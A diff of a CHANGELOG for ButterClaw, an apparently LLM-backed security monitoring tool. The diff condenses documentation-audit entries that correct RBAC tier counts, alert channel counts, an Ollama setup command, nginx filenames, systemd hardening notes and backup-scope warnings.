-- **3-Tier → 4-Tier RBAC (`docs/SECURITY.md`):** Two occurrences corrected — the Base
-  Security Mechanisms table (Authorization row) and the ASI-02 mitigation description.
-  Both now read "4-tier RBAC (infrastructure/admin/operator/viewer)." See 0.6.5.1 for
-  the corresponding corrections in `ARCHITECTURE.md` and `API.md`.
+- **5 Channels → 6 (`docs/SECURITY.md`):** Alerting row corrected to include all 6
+  channels with names listed.
 
-- **5 Channels → 6 (`docs/SECURITY.md`):** The Alerting row in the Base Security
-  Mechanisms table referenced "5 external channels." The correct count is 6: webhook,
-  discord, telegram, ntfy, smtp, gotify. Corrected to include all 6 with names listed.
+- **Container Security Row Expanded (`docs/SECURITY.md`):** Full set of active systemd
+  hardening directives documented: `ProtectSystem=strict`, `NoNewPrivileges=true`,
+  `ProtectHome=true`, `PrivateTmp=true`.
 
-- **Container Security Row Expanded (`docs/SECURITY.md`):** The Container row previously
-  listed only `ProtectSystem=strict`. The full set of systemd hardening directives active
-  in `butterclaw.service` — `ProtectSystem=strict`, `NoNewPrivileges=true`,
-  `ProtectHome=true`, `PrivateTmp=true` — are now documented.
+- **Broken Ollama Instruction (`docs/DEPLOYMENT.md`):** `ollama pull Modelfile.example`
+  is not a valid Ollama command. Corrected to two-step workflow. Modelfile parameters
+  table added inline.
 
-- **Broken Ollama Instruction (`docs/DEPLOYMENT.md`):** The LLM setup section instructed
-  users to run `ollama pull Modelfile.example`. This is not a valid Ollama command —
-  `Modelfile.example` is a local file, not a registry model tag. The correct two-step
-  workflow is: (1) `ollama pull gemma4:e4b` to fetch the base model, then (2)
-  `ollama create butterclaw-optimized -f Modelfile.example` to apply ButterClaw's tuned
-  parameter profile (16k context, temperature 0.3, top_p 0.9). A Modelfile parameters
-  table has been added inline for reference.
+- **Non-Existent `watcher.service` Reference (`docs/DEPLOYMENT.md`):** `systemd/`
+  contains only `butterclaw.service`. Section now documents the actual state, provides
+  a workaround (`screen`/`tmux`), and notes a dedicated unit is planned.
 
-- **Non-Existent `watcher.service` Reference (`docs/DEPLOYMENT.md`):** The systemd
-  deployment section referenced `watcher.service` as a file to copy and enable. That
-  file does not exist — `systemd/` contains only `butterclaw.service`. The section now
-  documents the actual state (no watcher unit exists), provides a workaround
-  (`ExecStartPost` or `screen`/`tmux`), and notes a dedicated unit is planned.
+- **Wrong nginx Config Filename (`docs/DEPLOYMENT.md`):** All references to
+  `nginx/nginx.conf` corrected to `nginx/butterclaw.conf` and `nginx/default.conf`.
 
-- **Wrong nginx Config Filename (`docs/DEPLOYMENT.md`):** The guide referenced
-  `nginx/nginx.conf` in multiple places. That file does not exist. The actual files are
-  `nginx/butterclaw.conf` (primary vhost) and `nginx/default.conf` (fallback, returns
-  444). All references corrected; a note explains the `conf.d` mount pattern that makes
-  both files active automatically.
+- **CSP Header Claim Removed (`docs/SECURITY.md`):** No `Content-Security-Policy`
+  header is present in `nginx/butterclaw.conf`. Note added: planned for v0.7.0.
 
-- **CSP Header Claim Removed (`docs/SECURITY.md`):** The v0.6.3.2 CHANGELOG entry
-  described a "CSP lockdown" as shipped. A direct read of `nginx/butterclaw.conf`
-  confirms no `Content-Security-Policy` header is present. The corrected SECURITY.md
-  adds a note: "A Content-Security-Policy header is planned but not yet present as of
-  v0.6.5."
+#### Changed
 
-### Changed
+- **Backup Scope Documented (`docs/DEPLOYMENT.md`):** Full inclusion/exclusion table
+  added. Critical warning added: the OS keyring entry holding the ButterVault master
+  key cannot be backed up by the script — loss means permanent vault data loss.
 
-- **Backup Scope Documented (`docs/DEPLOYMENT.md`):** The backup section previously gave
-  no information about what `backup.sh` includes or excludes. A full inclusion/exclusion
-  table has been added. Critical addition: an explicit warning that the OS keyring entry
-  holding the ButterVault master key **cannot** be backed up by the script and must be
-  exported separately before any host migration — loss of the keyring entry means vault
-  data is permanently unrecoverable.
+- **`butterclaw-ntfy` Documented (`docs/DEPLOYMENT.md`):** Container name, port 2586,
+  CLI subscribe command, and web UI access documented for the first time.
 
-- **`butterclaw-ntfy` Documented (`docs/DEPLOYMENT.md`):** The bundled ntfy service
-  (`container: butterclaw-ntfy`, port `2586`) was entirely absent from the deployment
-  guide despite shipping in `docker-compose.yml`. A new Section 8 documents the
-  container name, port, CLI subscribe command, web UI access, and the correct internal
-  Docker hostname to use when configuring the ntfy channel via the Alert Dispatcher API.
+- **`ReadWritePaths` Gap Disclosed (`docs/DEPLOYMENT.md`):** `retry_queue.json` and
+  `watcher.pid` will fail to write under `ProtectSystem=strict`. Gap documented with
+  corrected `ReadWritePaths` line provided inline.
 
-- **`ReadWritePaths` Gap Disclosed (`docs/DEPLOYMENT.md`):** The systemd hardening
-  table is accurate as written, but a "Known gap" callout has been added: the current
-  `butterclaw.service` `ReadWritePaths` does not include `retry_queue.json` or
-  `watcher.pid`. Under `ProtectSystem=strict`, both files will fail to write if the
-  watcher runs under the same service account. The corrected `ReadWritePaths` line is
-  provided inline for operators to apply locally until the unit file is updated upstream.
+- **Auth Gateway Diagnostics Expanded (`docs/DEPLOYMENT.md`):** `infrastructure` role
+  documented explicitly with recovery path after Gibson sequence.
 
-- **Auth Gateway Diagnostics Expanded (`docs/DEPLOYMENT.md`):** The diagnostics section
-  now documents the `infrastructure` role explicitly: privilege level -1, bootstrapped
-  from `BUTTERCLAW_API_KEY` via `bootstrap_infrastructure_keys_auto_heal()`, excluded
-  from `GET /api/auth/keys` listings, and the recovery path after Gibson (restart server
-  with `BUTTERCLAW_API_KEY` set).
-
-- **Docker Stack Table Added (`docs/DEPLOYMENT.md`):** A three-row summary table
-  (container name, service, port, resource limit) replaces a prose description of the
-  stack. `butterclaw-server` (512 MB/1 CPU), nginx, and `butterclaw-ntfy` (port 2586)
-  are all explicitly named.
-
-- **nginx Configuration Note Added (`docs/DEPLOYMENT.md`):** An explicit callout states
-  that `nginx/nginx.conf` does not exist and explains why all files in `nginx/` are
-  active without manual inclusion (the `conf.d` volume mount pattern).
-
-### Architecture Notes
+#### Architecture Notes
 
 **Complete Findings Table — SECURITY.md & DEPLOYMENT.md Audit:**
 
@@ -386,143 +527,87 @@ on startup with an older config.
 | 1 | `SECURITY.md` | RBAC tier count (Authorization row) | 3-tier | 4-tier | `ROLE_HIERARCHY` in `auth.py` |
 | 2 | `SECURITY.md` | RBAC tier count (ASI-02) | 3-tier | 4-tier | `ROLE_HIERARCHY` in `auth.py` |
 | 3 | `SECURITY.md` | Alert channel count | 5 | 6 | `alert_dispatcher.py` channel registry |
-| 4 | `SECURITY.md` | ASI-08 entry | Missing | Documented | `post_brain` scope in `server.py` + `policy_engine.py` |
-| 5 | `SECURITY.md` | Container hardening directives | `ProtectSystem=strict` only | All 4 directives | `systemd/butterclaw.service` |
+| 4 | `SECURITY.md` | ASI-08 entry | Missing | Documented | `post_brain` scope in `server.py` |
+| 5 | `SECURITY.md` | Container hardening directives | 1 directive | All 4 | `systemd/butterclaw.service` |
 | 6 | `SECURITY.md` | CSP header | Implied present | Not in conf | `nginx/butterclaw.conf` direct read |
-| 7 | `DEPLOYMENT.md` | Ollama setup command | `ollama pull Modelfile.example` | 2-step: pull then create | `Modelfile.example` + Ollama CLI docs |
+| 7 | `DEPLOYMENT.md` | Ollama setup command | `ollama pull Modelfile.example` | 2-step | `Modelfile.example` + Ollama CLI |
 | 8 | `DEPLOYMENT.md` | `watcher.service` exists | Referenced as existing | Does not exist | `systemd/` directory listing |
 | 9 | `DEPLOYMENT.md` | nginx config filename | `nginx/nginx.conf` | `nginx/butterclaw.conf` + `nginx/default.conf` | `nginx/` directory listing |
 | 10 | `DEPLOYMENT.md` | ntfy container | Undocumented | `butterclaw-ntfy` port 2586 | `docker-compose.yml` |
 | 11 | `DEPLOYMENT.md` | Backup scope | Undocumented | Table with OS keyring warning | `scripts/backup.sh` direct read |
 | 12 | `DEPLOYMENT.md` | `ReadWritePaths` coverage | Undisclosed gap | Gap documented with fix | `systemd/butterclaw.service` |
 
-**No code changes in this release.** All modifications are documentation-only.
+**No code changes in this section.** All modifications are documentation-only.
 
 ---
 
-## [0.6.5.1] - Documentation Audit: v0.6.5 Reconciliation - 2026-07-09
+### Documentation Audit: ARCHITECTURE.md & API.md
 
-### Fixed
+#### Fixed
 
 - **4-Tier RBAC Correction (`docs/ARCHITECTURE.md`, `docs/API.md`):** Both documents
-  incorrectly described ButterClaw's access control system as 3-tier. The v0.6.0 Auth
-  Layer introduced a fourth role — `infrastructure` at privilege level `-1` — specifically
-  to give the Watcher daemon and auto-healing components a machine-to-machine identity
-  that clears the Gateway without consuming human operator quota. This role has existed
-  in `ROLE_HIERARCHY` in `auth.py` since v0.6.3.1 ("Infrastructure Auto-Healing") but
-  was never reflected in either doc. All references to "3-tier RBAC" have been updated
-  to "4-tier (Infrastructure, Admin, Operator, Viewer)" across both files.
+  incorrectly described ButterClaw's access control system as 3-tier. The `infrastructure`
+  role at privilege level `-1` has existed in `ROLE_HIERARCHY` since v0.6.3.1 but was
+  never reflected in either doc. All references updated to "4-tier
+  (Infrastructure, Admin, Operator, Viewer)" across both files.
 
-- **Route Count Correction (`docs/API.md`):** The opening sentence stated 43 routes. The
-  correct count is **49**. The API.md endpoint tables have always been correct (7 Auth +
-  8 Policy + 13 Alert + 5 Core + 6 MCP + 10 Vault/OAuth = 49) — the discrepancy was
-  introduced by a note claiming certain GET/POST pairs on the same path should be counted
-  as a single route. In Flask, different HTTP methods on the same path are registered as
-  entirely separate routes. The "reduced to 43 to account for shared endpoints" note has
-  been removed and the opening sentence corrected to 49.
+- **Route Count Correction (`docs/API.md`):** Opening sentence stated 43 routes. Correct
+  count is **49**. The API.md endpoint tables were always correct — the discrepancy was
+  introduced by a note claiming GET/POST pairs on the same path should count as one route.
+  In Flask they are registered as separate routes. Note removed, count corrected.
 
-- **Operator Count Correction (`docs/ARCHITECTURE.md`):** The Policy Layer description in
-  the Exoskeleton diagram caption referenced "16 operators." The correct count is **15**,
-  matching the operator dispatch table in `policy_engine.py`:
-  `contains`, `not_contains`, `equals`, `not_equals`, `starts_with`, `ends_with`,
-  `regex_match`, `greater_than`, `less_than`, `greater_equal`, `less_equal`,
-  `in_list`, `not_in_list`, `length_gt`, `length_lt`.
+- **Operator Count Correction (`docs/ARCHITECTURE.md`):** Policy Layer caption referenced
+  "16 operators." Correct count is **15**, matching the operator dispatch table in
+  `policy_engine.py`.
 
-- **Alert Channel Count Correction (`docs/ARCHITECTURE.md`):** The Alert Layer description
-  referenced "5 channels." v0.6.5 ships with **6** (`webhook`, `discord`, `telegram`,
-  `ntfy`, `smtp`, `gotify`). SMTP and Gotify were added in v0.6.5 (S-02 Gotify Leak
-  Plugged, S-04 Encrypted SMTP) but the architecture diagram caption was not updated.
+- **Alert Channel Count Correction (`docs/ARCHITECTURE.md`):** Alert Layer referenced "5
+  channels." v0.6.5 ships with **6** — `webhook`, `discord`, `telegram`, `ntfy`, `smtp`,
+  `gotify`. Caption updated.
 
-### Changed
+#### Changed
 
-- **`infrastructure` Role Fully Documented (`docs/API.md`):** The infrastructure role now
-  has a dedicated row in the Role Hierarchy table: privilege level `-1`, rate limit
-  1000 req/min, bootstrapped from `BUTTERCLAW_API_KEY` via
-  `bootstrap_infrastructure_keys_auto_heal()` on startup, excluded from
-  `GET /api/auth/keys` listings. A callout note clarifies it cannot be created via the
-  API and is intended for machine-to-machine use only — never for human operators.
+- **`infrastructure` Role Fully Documented (`docs/API.md`):** Dedicated row added to
+  the Role Hierarchy table: privilege `-1`, rate limit 1000 req/min, bootstrapped from
+  `BUTTERCLAW_API_KEY`, excluded from `GET /api/auth/keys` listings, machine-to-machine
+  only.
 
-- **`ARCHITECTURE.md` Expanded to Production Standard (`docs/ARCHITECTURE.md`):** The
-  existing skeleton (6-layer ASCII diagram, 5-node Mermaid flowchart, 10-row component
-  table) has been retained and extended with the following sections, all derived directly
-  from source code:
+- **`ARCHITECTURE.md` Expanded to Production Standard:** Retained existing skeleton and
+  extended with:
+  - **Trust Boundaries & Security Model** — Six named trust zones with trust levels and
+    inter-zone communication rules. Explicitly documents the unauthenticated
+    Watcher→Server path over `127.0.0.1:5000` (see D-03).
+  - **System Invariants (I-01 → I-09)** — Nine code-level properties including chain step
+    limit (max 10 / 60s timeout), retry queue bound (100 entries), and the
+    sanitizer-is-a-targeted-blacklist rule.
+  - **Data Flow Walkthroughs** — Complete step-by-step flows for Live Log → Verdict →
+    Action (13 steps) and Gibson Sequence (7 steps).
+  - **Design Decisions (D-01 → D-07)** — Written rationale for HMAC-not-JWT, no-eval
+    policy engine, unauthenticated watcher (D-03), allow-never-short-circuits, keyring-only
+    master key, targeted-blacklist sanitizer, and policies-survive-Gibson.
+  - **Extension Points Table** — Six documented extension surfaces.
+  - **Enhanced Component Map** — "NOT Responsible For" and "Failure Mode" columns added.
 
-  - **Trust Boundaries & Security Model** — Six named trust zones (Internet-Facing, Localhost/
-    Watcher, LLM Output, MCP Tools, Credential Plane, Policy Plane) with trust levels and
-    inter-zone communication rules. Explicitly documents that the Watcher→Server path over
-    `127.0.0.1:5000` is unauthenticated by design (see D-03) and must not be exposed on
-    external interfaces.
+- **`API.md` Content Additions:** All 6 alert channel types and all 9 alert event types
+  documented. `POST /api/analyze` request/response schemas added. Route Count Summary
+  table and error response envelope format added.
 
-  - **System Invariants (I-01 → I-09)** — Nine code-level properties that must hold across
-    all future changes: master key scope, barrier-always-encrypts, Gibson atomicity,
-    session-key-derives-from-vault, allow-never-short-circuits, watcher singleton, chain
-    step limit (max 10 / 60s timeout), retry queue bound (100 entries), and the
-    sanitizer-is-a-targeted-blacklist rule (with the rationale for why it is NOT an
-    aggressive allowlist).
+- **`docs/THREAT_MODEL.md` — New File:** Formal threat model covering in-scope and
+  out-of-scope threat actors, explicit system assumptions, known limitations, and
+  failure modes.
 
-  - **Data Flow Walkthroughs** — Two complete step-by-step flows: (A) Live Log → Verdict →
-    Action (13 steps, component-by-component from nginx through the Auditor), and (B) Gibson
-    Sequence (7 steps, from trigger through credential-wiped state). Both include the
-    DRY_RUN gate, policy scope checkpoints, and branching conditions.
+#### Architecture Notes
 
-  - **Paranoia Dial Reference Table** — Level 1 (Observe), Level 2 (Active Defense: SIGKILL),
-    Level 3 (Lockdown: SIGKILL + Gibson). Notes the DRY_RUN hardcode block.
-
-  - **Source Code Map** — 16 files and directories with approximate line counts, ownership
-    summary, and key entry points. Intended as a contributor onboarding reference and
-    searchable starting point for code review.
-
-  - **DRIFT Policy Engine Scope Reference** — Scope-by-scope table of available context
-    fields and valid actions for `pre_brain`, `post_brain`, and `pre_tool`, plus the full
-    15-operator list with the no-`eval()` guarantee stated explicitly.
-
-  - **Design Decisions (D-01 → D-07)** — Seven rationale entries covering HMAC-not-JWT,
-    no-eval policy engine, unauthenticated watcher (D-03 — the entry most likely to be
-    flagged in a security review without written rationale), allow-never-short-circuits,
-    keyring-only master key, targeted-blacklist sanitizer, and policies-survive-Gibson.
-
-  - **Extension Points Table** — Six documented extension surfaces: LLM backend, MCP
-    transport, alert channels, policy operators, signature patterns, and RBAC roles.
-
-  - **Enhanced Component Map** — Existing table extended with "NOT Responsible For" and
-    "Failure Mode" columns for all 12 components. Mirrors the negative-scoping pattern
-    used by Cilium and Teleport architecture documentation.
-
-- **`API.md` Content Additions (`docs/API.md`):** Beyond the numerical corrections, the
-  following reference content was added to align the document with the actual v0.6.5
-  surface area:
-
-  - All 6 alert channel types documented (`webhook`, `discord`, `telegram`, `ntfy`,
-    `smtp`, `gotify`) — `smtp` and `gotify` were absent from the prior version.
-  - All 9 alert event types listed explicitly.
-  - `POST /api/analyze` request and response JSON schemas added inline.
-  - Route Count Summary table added at the end of the endpoint reference — a per-module
-    breakdown showing routes and the version each group was introduced.
-  - Error response envelope format and HTTP status code table added.
-  - Cross-links to `ARCHITECTURE.md`, `SECURITY.md`, and `DEPLOYMENT.md` added as a
-    Related Documentation footer on both docs.
-
-### Architecture Notes
-
-**Documentation Drift Summary — What Was Wrong vs. What Is True:**
+**Documentation Drift Summary:**
 
 | Claim | Document | Was | Is | Source of Truth |
 |---|---|---|---|---|
 | RBAC tier count | `ARCHITECTURE.md`, `API.md` | 3-tier | 4-tier | `ROLE_HIERARCHY` in `auth.py` |
-| `infrastructure` role | `API.md` | Undocumented | privilege=-1, rate=1000/min, machine-to-machine only | `auth.py` top of file |
-| Total API routes | `API.md` (opening sentence) | 43 | 49 | Table sum in same file; Flask route semantics |
-| Policy operators | `ARCHITECTURE.md` | 16 | 15 | Operator dispatch table in `policy_engine.py` |
-| Alert channel count | `ARCHITECTURE.md` | 5 | 6 | `alert_dispatcher.py` channel type registry |
-| Channels documented | `API.md` | 4 (no smtp, gotify) | 6 | `alert_dispatcher.py` (S-02, S-04 from v0.6.5) |
+| `infrastructure` role | `API.md` | Undocumented | privilege=-1, rate=1000/min | `auth.py` |
+| Total API routes | `API.md` | 43 | 49 | Table sum in same file |
+| Policy operators | `ARCHITECTURE.md` | 16 | 15 | Dispatch table in `policy_engine.py` |
+| Alert channel count | `ARCHITECTURE.md` | 5 | 6 | `alert_dispatcher.py` registry |
 
-**Why the drift occurred:** The `infrastructure` role and route count errors originated in
-v0.6.3.1 and v0.6.3 respectively, when the Auth bootstrapping and route expansion shipped
-without corresponding doc updates. The operator count and channel count diverged in v0.6.5
-when the S-02 (Gotify) and S-04 (SMTP) security hardening items changed the alert surface
-but the architecture diagram caption was not updated alongside the code changes.
-
-**No code changes in this release.** All modifications are documentation-only. Zero Python
-files, config files, or SQLite schemas were altered.
+**No code changes in this section.** All modifications are documentation-only.
 
 ---
 
